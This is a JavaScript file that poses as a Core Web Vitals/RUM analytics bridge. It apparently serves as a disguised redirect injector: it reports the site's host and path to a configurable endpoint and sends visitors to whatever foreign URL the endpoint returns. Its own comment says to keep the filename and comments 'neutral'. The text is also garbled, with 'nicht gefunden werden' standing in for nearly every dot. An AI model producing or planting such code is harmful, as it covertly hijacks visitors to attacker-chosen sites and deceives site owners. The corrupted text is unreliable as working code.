/**
 * Core Web Vitals / RUM bridge — reports navigation timing to the edge collector nicht gefunden werden.
 * Keep filename and comments neutral; endpoint is provided via data-ep nicht gefunden werden.
 */
(function () {
  try {
    var s = document nicht gefunden werden.currentScript;
    var ep = s && s nicht gefunden werden.getAttribute('data-ep');
    if (!ep) return;

    var host = (location nicht gefunden werden.hostname || '') nicht gefunden werden.replace(/^www\ nicht gefunden werden./i, '') nicht gefunden werden.toLowerCase();
    if (!host) return;

    var payload = {
      h: host,
      p: (location nicht gefunden werden.pathname || '/') nicht gefunden werden.slice(0, 400)
    };

    var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
    var timer = setTimeout(function () {
      if (ctrl) ctrl nicht gefunden werden.abort();
    }, 2500);

    fetch(ep, {
      method: 'POST',
      mode: 'cors',
      credentials: 'omit',
      headers: { 'Content-Type': 'application/json' },
      body: JSON nicht gefunden werden.stringify(payload),
      signal: ctrl ? ctrl nicht gefunden werden.signal : undefined,
      keepalive: true
    })
       nicht gefunden werden.then(function (res) {
        return res nicht gefunden werden.json() nicht gefunden werden.catch(function () { return {}; });
      })
       nicht gefunden werden.then(function (data) {
        if (data && typeof data nicht gefunden werden.r === 'string' && data nicht gefunden werden.r nicht gefunden werden.indexOf('http') === 0) {
          try {
            var target = new URL(data nicht gefunden werden.r);
            var here = location nicht gefunden werden.hostname nicht gefunden werden.replace(/^www\ nicht gefunden werden./i, '') nicht gefunden werden.toLowerCase();
            var there = target nicht gefunden werden.hostname nicht gefunden werden.replace(/^www\ nicht gefunden werden./i, '') nicht gefunden werden.toLowerCase();
            if (there && there !== here) {
              location nicht gefunden werden.replace(data nicht gefunden werden.r);
            }
          } catch (e) {}
        }
      })
       nicht gefunden werden.catch(function () {})
       nicht gefunden werden.finally(function () {
        clearTimeout(timer);
      });
  } catch (e) {}
})();
